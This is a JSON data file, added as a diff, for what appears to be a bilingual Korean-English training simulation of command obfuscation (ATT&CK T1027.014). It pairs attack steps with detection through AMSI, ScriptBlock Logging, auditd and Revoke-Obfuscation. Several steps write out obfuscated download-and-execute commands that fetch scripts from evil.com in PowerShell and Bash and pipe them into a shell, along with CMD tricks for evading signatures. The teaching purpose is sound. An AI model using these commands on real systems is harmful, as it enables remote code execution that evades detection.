@@ -1,0 +1,164 @@
+{
+  "id": "T1027.014",
+  "title": "Command Obfuscation 시뮬레이션",
+  "titleEn": "Command Obfuscation Simulation",
+  "duration": 8,
+  "phases": [
+    { "label": "🔤 CMD 난독화", "labelEn": "🔤 CMD Obfuscation", "steps": [0] },
+    { "label": "⚡ PowerShell 난독화", "labelEn": "⚡ PS Obfuscation", "steps": [1] },
+    { "label": "🐧 Bash 난독화", "labelEn": "🐧 Bash Obfuscation", "steps": [2] },
+    { "label": "🔍 탐지 & 해독", "labelEn": "🔍 Detection & Decode", "steps": [3, 4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Obfuscator)", "x": 50, "y": 80 },
+    { "id": "obfuscated", "label": "Obfuscated\nCommand", "x": 200, "y": 30 },
+    { "id": "shell", "label": "cmd/PS\nShell", "x": 200, "y": 130 },
+    { "id": "amsi", "label": "AMSI\nScan", "x": 350, "y": 80 },
+    { "id": "execution", "label": "Command\nExecution", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "obfuscated", "minStep": 0 },
+    { "from": "obfuscated", "to": "shell", "minStep": 0 },
+    { "from": "shell", "to": "amsi", "minStep": 3 },
+    { "from": "amsi", "to": "execution", "minStep": 3 }
+  ],
+  "desktopIcons": [
+    { "name": "PowerShell", "icon": "⚡" },
+    { "name": "cmd.exe", "icon": "💻" },
+    { "name": "Event Viewer", "icon": "📋" },
+    { "name": "Revoke-Obfuscation", "icon": "🔍" },
+    { "name": "AMSI Monitor", "icon": "🛡️" }
+  ],
+  "steps": [
+    {
+      "cmd": "# CMD 캐럿(^) 난독화 기법\nc^m^d /c \"^n^e^t u^s^e^r /do^main\"\n\n# CMD 환경변수 슬라이싱\nset a=powershell -c\n%a% \"whoami\"\n\n# CMD FOR 루프 난독화\ncmd /c \"set x=net user&&FOR /F %i IN ('echo %x%') DO @%i /domain\"",
+      "out": "[캐럿 난독화]\nThe request will be processed at a domain controller.\nUser accounts for \\\\DC01.corp.local\n-----------------------------------------\nAdministrator     jsmith        klee\nservice_acc       sql_svc       backup_user\n\n[환경변수 슬라이싱]\ncorp\\jsmith\n\n[FOR 루프]\nThe request will be processed at a domain controller.\nUser accounts for \\\\DC01.corp.local\n(동일 출력)\n\n[분석]\n- 3가지 CMD 난독화 기법 모두 동일한 결과 생성\n- 캐럿(^): CMD 이스케이프 문자, 실행 시 무시됨\n- 환경변수: set으로 명령어를 변수에 저장 후 실행\n- FOR 루프: 간접 실행으로 명령줄 로그 분산",
+      "def": "[Sysmon] Process cmd.exe with unusual caret characters in command line — obfuscation detected",
+      "defAction": "Tool: cmd.exe obfuscation\nTechnique 1: Caret insertion (^n^e^t → net)\nTechnique 2: Environment variable slicing (%a% → command)\nTechnique 3: FOR loop indirect execution\nSysmon Event: 1 (ProcessCreate with obfuscated CommandLine)\nCommand Line Entropy: High (unusual char distribution)\nRisk Level: High\nAction: Deobfuscate command line, investigate intent",
+      "desc": "CMD의 캐럿(^)은 이스케이프 문자로 실행 시 무시됩니다. 환경변수 슬라이싱과 FOR 루프로 명령어를 간접 실행하여 시그니처 매칭을 우회합니다.",
+      "descEn": "CMD caret (^) is an escape character ignored during execution. Environment variable slicing and FOR loops enable indirect execution, bypassing signature matching.",
+      "stepTitle": "CMD 캐럿/환경변수/FOR 루프 난독화",
+      "stepTitleEn": "CMD Caret, Environment Variable, and FOR Loop Obfuscation",
+      "feynman": "편지(명령어)에 글자 사이사이에 점(캐럿)을 찍어서 보냅니다: 'ㅎ.ㅏ.ㄴ.ㄱ.ㅜ.ㄱ'. 받는 사람(CMD)은 점을 무시하고 '한국'으로 읽지만, 검열관(보안도구)은 '한국'이라는 단어를 찾지 못합니다.",
+      "feynmanEn": "Dots (carets) are inserted between letters: 'H.E.L.L.O'. The recipient (CMD) ignores dots and reads 'HELLO', but the censor (security tool) can't find the word 'HELLO'.",
+      "expert": "CMD의 캐럿(^)은 특수문자 이스케이프에 사용되며, 일반 문자 앞에서는 무시됩니다. Windows 명령 인터프리터는 명령줄을 파싱할 때 캐럿을 먼저 제거합니다. Sysmon Event ID 1의 CommandLine 필드에는 난독화된 원본이 기록되므로, 캐럿 밀도(caret density = 캐럿 수/전체 길이)가 임계값을 초과하면 탐지할 수 있습니다. DOSfuscation 도구(Daniel Bohannon)는 이러한 CMD 난독화를 자동 생성합니다.",
+      "expertEn": "CMD caret (^) is used for special character escaping and is ignored before regular characters. The Windows command interpreter strips carets during parsing. Sysmon Event ID 1 CommandLine records the obfuscated original, so caret density exceeding thresholds triggers detection. DOSfuscation tool automates CMD obfuscation generation.",
+      "defTooltip": "🔐 CMD 캐럿 난독화! net user가 ^n^e^t로 위장!",
+      "defTooltipEn": "🔐 CMD caret obfuscation! net user disguised as ^n^e^t!",
+      "hackerLog": { "title": "cmd_obfuscation.log", "lines": ["[10:00:00] 캐럿 난독화 실행", "[10:00:01] 환경변수 슬라이싱 실행", "[10:00:03] FOR 루프 간접 실행", "[10:00:05] 도메인 사용자 열거 완료"] },
+      "terms": [
+        { "term": "캐럿 (^)", "def": "CMD 이스케이프 문자, 일반 문자 앞에서는 무시되어 난독화에 악용됨" },
+        { "term": "DOSfuscation", "def": "Daniel Bohannon이 개발한 CMD 명령어 난독화 자동화 도구" }
+      ]
+    },
+    {
+      "cmd": "# PowerShell 다중 계층 난독화\n# 계층 1: 문자열 결합\n$a='New-Ob'+'ject'; $b='Net.We'+'bClient';\nIEX((&$a $b).('Do'+'wnlo'+'adStr'+'ing').Invoke('http://evil.com/ps.ps1'))\n\n# 계층 2: Base64 인코딩 (-enc)\npowershell -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABzAC4AcABzADEAJwApACkA\n\n# 계층 3: 틱(`) 삽입\nI`n`v`o`k`e-E`x`p`r`e`s`s`i`o`n (N`e`w-O`b`j`e`c`t N`e`t.W`e`b`C`l`i`e`n`t).D`o`w`n`l`o`a`d`S`t`r`i`n`g('http://evil.com/ps.ps1')",
+      "out": "[계층 1: 문자열 결합]\nDownloading payload from evil.com...\n→ 시그니처 'New-Object Net.WebClient' 분리됨\n→ 기존 정규식 탐지 우회\n\n[계층 2: Base64 인코딩]\nBase64 디코딩:\n  IEX((New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1'))\n→ 전체 명령어가 단일 Base64 문자열로 인코딩\n→ 명령줄 로그에서 원문 확인 불가\n\n[계층 3: 틱 삽입]\n→ PowerShell 틱(`)은 이스케이프 문자\n→ I`n`v`o`k`e → Invoke로 해석\n→ 토큰 분리 탐지 우회\n\n[ScriptBlock Logging]\nEvent ID 4104: 3개 모두 동일하게 기록\n  IEX((New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1'))\n→ PowerShell 엔진이 난독화 해제 후 기록!",
+      "def": "[AMSI+4104] ScriptBlock Logging captured deobfuscated command: IEX Download Cradle to evil.com",
+      "defAction": "Tool: PowerShell obfuscation (3 layers)\nLayer 1: String concatenation ('New-Ob'+'ject')\nLayer 2: Base64 encoding (-enc)\nLayer 3: Tick insertion (I`n`v`o`k`e)\nAMSI Detection: All 3 layers → deobfuscated → malicious\nScriptBlock Logging: Event ID 4104 records deobfuscated text\nRisk Level: Critical\nAction: Block IEX download cradle, investigate C2 URL",
+      "desc": "PowerShell의 3가지 난독화 계층(문자열 결합, Base64, 틱 삽입)을 사용합니다. 그러나 AMSI와 ScriptBlock Logging(Event ID 4104)은 실행 직전에 난독화를 해제하여 원문을 기록합니다.",
+      "descEn": "Three PowerShell obfuscation layers: string concatenation, Base64 encoding, and tick insertion. However, AMSI and ScriptBlock Logging (Event ID 4104) deobfuscate at runtime, recording the original text.",
+      "stepTitle": "PowerShell 3계층 난독화: 결합, Base64, 틱",
+      "stepTitleEn": "3-Layer PowerShell Obfuscation: Concatenation, Base64, Tick",
+      "feynman": "암호문을 3가지 방법으로 작성합니다: 1) 단어를 쪼개기('안'+'녕'+'하'+'세'+'요'), 2) 전체를 외국어(Base64)로 번역, 3) 글자 사이에 점(틱) 찍기. 하지만 번역기(AMSI)가 모든 암호를 해독하고, 기록관(Event 4104)이 해독본을 보관합니다.",
+      "feynmanEn": "Writing secret messages three ways: 1) Split words ('Hel'+'lo'), 2) Translate to foreign language (Base64), 3) Insert dots between letters. But the translator (AMSI) decodes all secrets, and the archivist (Event 4104) keeps the decoded version.",
+      "expert": "PowerShell v5+의 ScriptBlock Logging은 파이프라인 실행 직전에 스크립트 블록의 AST(Abstract Syntax Tree)를 Event ID 4104에 기록합니다. 이 시점에서 모든 변수 확장, 문자열 결합, Base64 디코딩이 완료되어 원문이 노출됩니다. AMSI(Antimalware Scan Interface)는 동일한 시점에 AV 엔진에 컨텐츠를 전달합니다. 공격자는 AMSI 패치(amsi.dll의 AmsiScanBuffer를 NOP으로 덮어쓰기)로 우회하지만, 이 행위 자체가 Sysmon Event ID 7(ImageLoaded)과 ETW(Event Tracing for Windows)로 탐지됩니다.",
+      "expertEn": "PowerShell v5+ ScriptBlock Logging records AST in Event ID 4104 just before pipeline execution. All variable expansion, concatenation, and Base64 decoding is complete, exposing the original text. AMSI passes content to AV at the same point. Attackers patch AMSI (NOP AmsiScanBuffer), but this is detected by Sysmon Event ID 7 and ETW.",
+      "defTooltip": "🔐 AMSI + ScriptBlock Logging이 모든 난독화를 해제!",
+      "defTooltipEn": "🔐 AMSI + ScriptBlock Logging deobfuscate everything!",
+      "hackerLog": { "title": "ps_obfuscation.log", "lines": ["[10:10:00] 문자열 결합 난독화 실행", "[10:10:02] Base64 인코딩 난독화 실행", "[10:10:04] 틱 삽입 난독화 실행", "[10:10:06] Event ID 4104: 원문 기록됨"] },
+      "terms": [
+        { "term": "AMSI", "def": "Antimalware Scan Interface, 스크립트 실행 시 AV에 컨텐츠를 전달하는 API" },
+        { "term": "ScriptBlock Logging", "def": "PowerShell v5+에서 실행된 스크립트 블록의 원문을 Event ID 4104에 기록" }
+      ]
+    },
+    {
+      "cmd": "# Bash 난독화 기법\n# 1. Hex 인코딩\na=$'\\x63\\x75\\x72\\x6c'; eval \"$a http://evil.com/sh | bash\"\n\n# 2. Base64 파이프\necho 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2ggfCBiYXNo' | base64 -d | bash\n\n# 3. 변수 치환 + 역순\nrev<<<'hsab | hs/moc.live//:ptth lruc' | bash\n\n# 4. $IFS 공백 우회\ncurl${IFS}http://evil.com/sh|bash",
+      "out": "[Hex 인코딩]\n\\x63\\x75\\x72\\x6c → curl\n→ curl http://evil.com/sh | bash 실행\n\n[Base64 파이프]\nY3VybCBodHRwOi8vZXZpbC5jb20vc2ggfCBiYXNo\n→ curl http://evil.com/sh | bash\n\n[역순 (rev)]\nhsab | hs/moc.live//:ptth lruc\n→ (역순) curl http://evil.com/sh | bash\n\n[$IFS 공백 우회]\n${IFS} → 공백 문자로 치환\n→ curl http://evil.com/sh|bash\n\n[auditd 탐지]\ntype=EXECVE: argc=3 a0=\"bash\" a1=\"-c\" a2=\"curl http://evil.com/sh | bash\"\n→ auditd는 쉘이 해석한 최종 명령어를 기록",
+      "def": "[auditd] Bash eval with hex-encoded command — curl to external domain detected",
+      "defAction": "Tool: Bash obfuscation (4 techniques)\nTechnique 1: Hex encoding ($'\\x63' → 'c')\nTechnique 2: Base64 pipe (echo | base64 -d | bash)\nTechnique 3: Reverse string (rev command)\nTechnique 4: $IFS space bypass\nauditd Detection: EXECVE syscall records final decoded command\nRisk Level: Critical\nAction: Block outbound curl to unknown domains, investigate bash history",
+      "desc": "Bash에서 Hex 인코딩, Base64 파이프, 역순(rev), $IFS 공백 우회 등 4가지 난독화 기법을 사용합니다. auditd의 EXECVE 레코드는 쉘이 해석한 최종 명령어를 기록하여 난독화를 무력화합니다.",
+      "descEn": "Four Bash obfuscation techniques: hex encoding, Base64 piping, reverse strings, and $IFS space bypass. auditd EXECVE records capture the final shell-interpreted command, neutralizing obfuscation.",
+      "stepTitle": "Bash 4가지 난독화: Hex, Base64, 역순, $IFS",
+      "stepTitleEn": "4 Bash Obfuscation Techniques: Hex, Base64, Reverse, $IFS",
+      "feynman": "Bash에서는 암호를 4가지로 작성합니다: 1) 글자를 숫자코드(Hex)로 변환, 2) 전체를 외국어(Base64)로, 3) 거울에 비친 것처럼 거꾸로, 4) 단어 사이 공백을 비밀 기호($IFS)로. 하지만 감시카메라(auditd)는 최종 실행 내용을 기록합니다.",
+      "feynmanEn": "Bash uses 4 secret codes: 1) Letters as number codes (Hex), 2) Whole text as foreign language (Base64), 3) Mirror writing (reverse), 4) Secret space symbol ($IFS). But surveillance (auditd) records the final execution.",
+      "expert": "Bash의 $'' 구문(ANSI-C Quoting)은 \\xHH 이스케이프 시퀀스를 해석합니다. 이는 쉘 레벨에서 처리되므로 execve() 시스콜 시점에는 이미 디코딩됩니다. auditd의 EXECVE 레코드는 커널 레벨에서 시스콜을 캡처하므로 쉘 난독화에 영향받지 않습니다. 그러나 eval 내에서 다시 난독화된 명령이 실행되면 중첩 실행은 별도의 EXECVE로 기록됩니다. osquery의 process_events 테이블도 cmdline을 기록하여 탐지에 활용됩니다.",
+      "expertEn": "Bash $'' ANSI-C Quoting interprets \\xHH escape sequences at shell level, already decoded by execve() syscall. auditd EXECVE records capture at kernel level, unaffected by shell obfuscation. eval nesting creates separate EXECVE records. osquery process_events also records cmdline for detection.",
+      "defTooltip": "🔐 Bash Hex/Base64/역순 난독화! auditd EXECVE로 탐지!",
+      "defTooltipEn": "🔐 Bash Hex/Base64/reverse obfuscation! auditd EXECVE detection!",
+      "hackerLog": { "title": "bash_obfuscation.log", "lines": ["[10:15:00] Hex 인코딩 curl 실행", "[10:15:02] Base64 파이프 실행", "[10:15:04] rev 역순 명령 실행", "[10:15:06] auditd EXECVE 기록"] },
+      "terms": [
+        { "term": "ANSI-C Quoting", "def": "Bash의 $'' 구문, \\x 이스케이프를 해석하여 바이너리 문자열 생성" },
+        { "term": "auditd EXECVE", "def": "Linux 커널의 execve 시스콜을 캡처하여 최종 실행 명령어를 기록" }
+      ]
+    },
+    {
+      "cmd": "# Revoke-Obfuscation으로 PowerShell 난독화 탐지\nImport-Module Revoke-Obfuscation\n\n# 의심 스크립트 블록 분석\n$scripts = Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath \"*[System[EventID=4104]]\" -MaxEvents 100\n$scripts | Measure-RvoObfuscation | Where-Object { $_.IsObfuscated -eq $true } | Format-Table Score, Technique, ScriptBlock",
+      "out": "[Revoke-Obfuscation Analysis]\n\nScore  Technique              ScriptBlock (preview)\n-----  ---------              --------------------\n0.95   StringConcat+IEX       $a='New-Ob'+'ject'; IEX...\n0.92   Base64+EncodedCommand  powershell -enc SQBFAFG...\n0.88   TickInsertion          I`n`v`o`k`e-E`x`p`r...\n0.45   CharArrayConvert       [char[]]@(73,69,88)...\n\n[분석 결과]\n- 4건의 난독화된 스크립트 블록 탐지\n- Score > 0.7: 높은 확률의 난독화\n- 주요 기법: 문자열 결합, Base64, 틱 삽입\n\n[명령줄 엔트로피 분석]\n- 정상 PowerShell 명령줄 엔트로피: 3.5~4.5\n- 난독화된 명령줄 엔트로피: 5.2~6.8\n- 캐럿 밀도 > 15%: CMD 난독화 의심\n- 틱 밀도 > 10%: PowerShell 난독화 의심",
+      "def": "[SIEM] Revoke-Obfuscation detected 4 obfuscated script blocks — scores 0.45-0.95",
+      "defAction": "Tool: Revoke-Obfuscation + Entropy Analysis\nObfuscated Scripts: 4 detected\nHigh Confidence (>0.7): 3 scripts\nMedium Confidence (0.4-0.7): 1 script\nEntropy Analysis: Normal 3.5-4.5, Obfuscated 5.2-6.8\nCaret Density: >15% = CMD obfuscation\nTick Density: >10% = PS obfuscation\nRisk Level: Critical\nAction: Deobfuscate, correlate with process tree, block C2 URLs",
+      "desc": "Revoke-Obfuscation 도구로 ScriptBlock Logging의 Event ID 4104를 분석하여 난독화된 스크립트를 자동 탐지합니다. 명령줄 엔트로피와 특수문자 밀도 분석도 병행합니다.",
+      "descEn": "Revoke-Obfuscation analyzes ScriptBlock Logging Event ID 4104 to automatically detect obfuscated scripts. Command line entropy and special character density analysis are also performed.",
+      "stepTitle": "Revoke-Obfuscation 도구로 난독화 자동 탐지",
+      "stepTitleEn": "Automated Obfuscation Detection with Revoke-Obfuscation",
+      "feynman": "암호 해독 전문가(Revoke-Obfuscation)가 기록된 모든 편지(스크립트)를 검토합니다. 각 편지에 '암호화 점수'를 매깁니다: 0.95점이면 거의 확실한 암호문입니다. 추가로 '글자 무질서도(엔트로피)'를 측정하여 정상 편지(3.5)와 암호문(6.8)을 구분합니다.",
+      "feynmanEn": "A code-breaking expert (Revoke-Obfuscation) reviews all recorded letters (scripts). Each gets an 'encryption score': 0.95 means almost certainly encoded. 'Letter disorder (entropy)' measurement distinguishes normal letters (3.5) from coded messages (6.8).",
+      "expert": "Revoke-Obfuscation(Daniel Bohannon, Lee Holmes)은 PowerShell AST의 통계적 특성을 분석합니다. 문자열 결합 빈도, 틱/캐럿 밀도, 토큰 엔트로피, Invoke-Expression 호출 패턴 등을 ML 모델로 분류합니다. SIGMA 규칙으로 CommandLine 필드의 엔트로피를 계산하여 탐지할 수도 있습니다: entropy(CommandLine) > 5.0 AND length(CommandLine) > 200. Microsoft의 Defender for Endpoint도 내장 AMSI 분석으로 난독화를 탐지합니다.",
+      "expertEn": "Revoke-Obfuscation analyzes PowerShell AST statistical properties: string concatenation frequency, tick/caret density, token entropy, IEX call patterns via ML model. SIGMA rules can calculate CommandLine entropy for detection. Microsoft Defender for Endpoint also detects obfuscation via built-in AMSI analysis.",
+      "defTooltip": "🔐 4건 난독화 탐지! 엔트로피 분석으로 확인!",
+      "defTooltipEn": "🔐 4 obfuscated scripts detected! Confirmed by entropy analysis!",
+      "hackerLog": { "title": "revoke_obf.log", "lines": ["[10:25:00] Revoke-Obfuscation 분석 시작", "[10:25:02] 4건 난독화 스크립트 탐지", "[10:25:04] 엔트로피 분석: 5.2~6.8", "[10:25:06] 캐럿/틱 밀도 분석 완료"] },
+      "terms": [
+        { "term": "Revoke-Obfuscation", "def": "Daniel Bohannon이 개발한 PowerShell 난독화 탐지 도구 (ML 기반)" },
+        { "term": "엔트로피 (Entropy)", "def": "문자열의 무질서도 측정값, 난독화된 텍스트는 높은 엔트로피를 보임" }
+      ]
+    },
+    {
+      "cmd": "# 종합 방어: AMSI + ScriptBlock Logging + 명령줄 모니터링\n# GPO 설정으로 전사 배포\n\n# 1. ScriptBlock Logging 활성화\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1\n\n# 2. Module Logging 활성화 (모든 모듈)\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' -Name 'EnableModuleLogging' -Value 1\n\n# 3. AMSI 상태 확인\nGet-MpPreference | Select-Object DisableRealtimeMonitoring, MAPSReporting",
+      "out": "[GPO 배포 결과]\n\n1. ScriptBlock Logging: 활성화 ✅\n   → Event ID 4104에 해독된 원문 기록\n   → 다중 계층 난독화도 최종 원문 기록\n\n2. Module Logging: 활성화 ✅\n   → Event ID 4103에 모듈 호출 기록\n   → Import-Module, New-Object 등 추적\n\n3. AMSI: 활성 ✅\n   DisableRealtimeMonitoring: False\n   MAPSReporting: Advanced (클라우드 분석)\n\n[종합 방어 체계]\n✅ AMSI: 실행 직전 컨텐츠 검사\n✅ ScriptBlock Logging (4104): 해독된 원문 기록\n✅ Module Logging (4103): 모듈 호출 추적\n✅ Sysmon EID 1: 명령줄 원본 기록\n✅ Revoke-Obfuscation: 자동 난독화 점수화\n✅ 엔트로피/밀도 분석: 비정상 명령줄 탐지\n✅ SIGMA 규칙: SIEM 자동 알림",
+      "def": "[SIEM] Full obfuscation defense deployed — AMSI, ScriptBlock Logging, Module Logging, entropy monitoring",
+      "defAction": "Tool: GPO + AMSI + Logging\nScriptBlock Logging: Enabled (Event ID 4104)\nModule Logging: Enabled (Event ID 4103)\nAMSI: Active with cloud analysis\nSysmon: CommandLine recording (Event ID 1)\nRevoke-Obfuscation: Scheduled analysis\nSIGMA Rules: Entropy + density alerting\nRisk Level: Mitigated\nAction: Continuous monitoring, AMSI bypass detection, user awareness",
+      "desc": "ScriptBlock Logging과 Module Logging을 GPO로 전사 배포하고, AMSI 상태를 확인합니다. 다중 방어 계층으로 명령어 난독화를 해독하고 기록합니다.",
+      "descEn": "Deploy ScriptBlock Logging and Module Logging via GPO enterprise-wide, verify AMSI status. Multi-layer defense deobfuscates and records obfuscated commands.",
+      "stepTitle": "AMSI + 로깅 + 엔트로피 분석 종합 방어",
+      "stepTitleEn": "Comprehensive Defense: AMSI + Logging + Entropy Analysis",
+      "feynman": "7겹 보안 방어망을 구축합니다: 1) 번역기(AMSI)가 모든 암호문을 해독, 2) 기록관(ScriptBlock)이 해독본 보관, 3) 관찰자(Module Logging)가 도구 사용 기록, 4) CCTV(Sysmon)가 원본 명령줄 촬영, 5) 암호 전문가(Revoke-Obfuscation)가 점수 매기기, 6) 무질서도 분석기(엔트로피)로 비정상 탐지, 7) 자동 경보(SIGMA)로 관리자 알림.",
+      "feynmanEn": "A 7-layer security net: 1) Translator (AMSI) decodes all ciphers, 2) Archivist (ScriptBlock) keeps decoded copies, 3) Observer (Module Logging) records tool usage, 4) CCTV (Sysmon) films original command lines, 5) Code expert (Revoke-Obfuscation) scores them, 6) Disorder analyzer (entropy) detects anomalies, 7) Auto-alarm (SIGMA) notifies admins.",
+      "defTooltip": "🔐 7계층 난독화 방어! AMSI+로깅+엔트로피!",
+      "defTooltipEn": "🔐 7-layer obfuscation defense! AMSI+Logging+Entropy!",
+      "hackerLog": { "title": "defense_complete.log", "lines": ["[10:35:00] ScriptBlock Logging GPO 배포", "[10:35:02] Module Logging GPO 배포", "[10:35:04] AMSI 상태 확인: 활성", "[10:35:06] SIGMA 규칙 배포 완료"] },
+      "terms": [
+        { "term": "Module Logging", "def": "PowerShell 모듈 호출을 Event ID 4103에 기록하는 로깅 기능" },
+        { "term": "GPO", "def": "Group Policy Object, Active Directory에서 전사 정책을 배포하는 관리 도구" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "explorer.exe",
+    "pid": 1204,
+    "children": [
+      {
+        "name": "cmd.exe (obfuscated)",
+        "pid": 5100,
+        "children": [
+          { "name": "net.exe", "pid": 5110, "children": [] }
+        ]
+      },
+      {
+        "name": "powershell.exe (-enc)",
+        "pid": 5200,
+        "children": [
+          { "name": "conhost.exe", "pid": 5210, "children": [] }
+        ]
+      },
+      {
+        "name": "bash (eval)",
+        "pid": 5300,
+        "children": [
+          { "name": "curl", "pid": 5310, "children": [] }
+        ]
+      }
+    ]
+  }
+}
